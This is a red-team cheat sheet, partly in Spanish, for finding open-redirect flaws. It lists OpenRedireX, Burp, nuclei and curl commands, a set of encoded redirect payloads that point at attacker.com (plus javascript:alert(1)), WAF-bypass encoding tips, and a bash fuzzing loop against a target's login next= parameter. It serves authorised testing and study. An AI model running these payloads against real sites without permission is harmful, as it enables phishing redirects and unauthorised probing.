---
aliases:
  - OpenRedireX
  - Open Redirect Scanner
  - ffuf Redirect
tags:
  - vuln/open-redirect
  - technique/discovery
  - asset/web-app
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Explotación|Explotación]]"
  - "[[Web]]"
tertiary categories:
  - "[[Web Explotación]]"
kind: SubCheatSheet
linked:
  - "[[Open Redirect]]"
  - "[[Burp Suite]]"
  - "[[ffuf]]"
---
# Open Redirect - Tooling

---

## OpenRedireX

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `git clone https://github.com/devanshbatham/OpenRedireX && cd OpenRedireX` | Install fuzzer dedicado | Primera vez. |
| `python openredirex.py -u "https://target/login?next=FUZZ" -p payloads/payloads.txt` | Fuzz single URL | Endpoint con redirect param conocido. |
| `python openredirex.py -l urls.txt -p payloads.txt` | Bulk over multiple URLs | Recon a escala. |
| `python openredirex.py -u "..." -p payloads.txt -c 50` | 50 threads concurrentes | Speed up. |
| `cat urls.txt \| python openredirex.py -p payloads.txt` | Pipe-friendly | Stdin chaining. |
| `python openredirex.py -u "..." -p payloads.txt --proxy http://127.0.0.1:8080` | Proxy through Burp | Inspection. |
| `python openredirex.py -u "..." -p payloads.txt -H "Cookie: session=$T"` | Authenticated fuzz | Endpoint detrás de auth. |
^or-tool-openredirex

---

## Burp Active Scanner + Param Miner

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Burp → Right-click request → "Do active scan" | Active scan con OR detection built-in | Burp Pro available. |
| Burp → BApp Store → "Param Miner" → Right-click → "Guess headers" | Detecta headers unkeyed que afectan redirect | Cache poisoning combo. |
| Burp → BApp Store → "Reflection" → install | Identificar reflejos de input | Pre-attack discovery. |
| Burp → Repeater → modificar `next=` con payloads manualmente | Manual fuzz + observe behavior | Fine-grained testing. |
| Burp → Intruder → payload set "Open redirect" o load `payloads.txt` | Bulk fuzz con payload set | Volume testing. |
| Burp → BApp Store → "Hackvertor" → wrap payloads encoded | Encoding dynamic | WAF bypass. |
| Burp → Logger++ → filter `response.status >= 300 && response.status < 400` | Solo respuestas 3xx | Visual review redirects. |
^or-tool-burp

---

## Wordlists

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `git clone https://github.com/swisskyrepo/PayloadsAllTheThings && ls "PayloadsAllTheThings/Open Redirect/"` | PayloadsAllTheThings OR list | Foundation. |
| `wget https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Open%20Redirect/Open%20Redirect%20payloads.txt` | Wordlist ready | Quick download. |
| `cat /usr/share/seclists/Fuzzing/URLs-and-paths-fuzz.txt` | SecLists URLs | Path fuzzing combo. |
| `git clone https://github.com/devanshbatham/OpenRedireX && cat OpenRedireX/payloads/payloads.txt` | OpenRedireX 300+ payloads | Pre-curated. |
| `wget https://raw.githubusercontent.com/cujanovic/Open-Redirect-Payloads/master/Open-Redirect-payloads.txt` | Cujanovic wordlist | Alternative comprehensive. |
| `cat custom.txt PayloadsAllTheThings.txt OpenRedireX.txt \| sort -u > combined.txt` | Combined deduplicado | Bulk fuzz custom. |
^or-tool-wordlists

---

## Manual curl / Custom Scripts

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -sI "https://target/login?next=https://attacker.com" \| grep -i location` | Quick single test | Manual sanity check. |
| `for p in $(cat payloads.txt); do ENC=$(jq -sRr @uri <<<"$p"); curl -sI "https://target/login?next=$ENC" \| grep -i location; done` | Bulk shell loop | Sin tools dedicadas. |
| `curl -sI "..." \| awk -F': ' '/^[Ll]ocation:/{print $2}'` | Parse Location header limpio | Pipe-friendly extraction. |
| `curl -s "..." \| grep -oE '<meta[^>]*refresh[^>]*>'` | Detectar meta refresh | Server-side OR via meta. |
| `curl -s "..." \| grep -oE 'location\s*[=.][^;]*'` | Detectar JS-based redirect | Client-side OR. |
| `curl -sLo /dev/null -w '%{url_effective}\n' "..."` | Follow redirects → final URL | Validate target final. |
| `nuclei -u target -t http/vulnerabilities/generic/open-redirect.yaml` | Templates curados | Auto-detection rápido. |
| `gau target.com \| grep -E 'redirect\|next\|return\|url=\|goto'` | URLs históricas con redirect params | Wayback recon. |
| `gf redirect < urls.txt` | Filter patterns con `gf` | Pattern-based filtering. |
| `cat urls.txt \| gf redirect \| qsreplace 'https://attacker.com' \| while read u; do curl -sI "$u" \| grep -i location; done` | Pipeline completo Wayback → fuzz | Full automation. |
^or-tool-manual

### Bash one-liner test

```bash
PAYLOADS=(
  'https://attacker.com'
  '//attacker.com'
  '\\\\attacker.com'
  'https://target.com@attacker.com'
  'https://target.com.attacker.com'
  'javascript:alert(1)'
  'https%3A%2F%2Fattacker.com'
  '%2F%2Fattacker.com'
  'https://attacker.com#@target.com'
  'https://target.com\@attacker.com'
)

for p in "${PAYLOADS[@]}"; do
  ENCODED=$(printf '%s' "$p" | jq -sRr @uri)
  RESULT=$(curl -sI "https://target.com/login?next=$ENCODED" | grep -i 'location:' | head -1)
  if echo "$RESULT" | grep -qiE 'attacker|alert'; then
    echo "[!] VULN: $p → $RESULT"
  fi
done
```

---
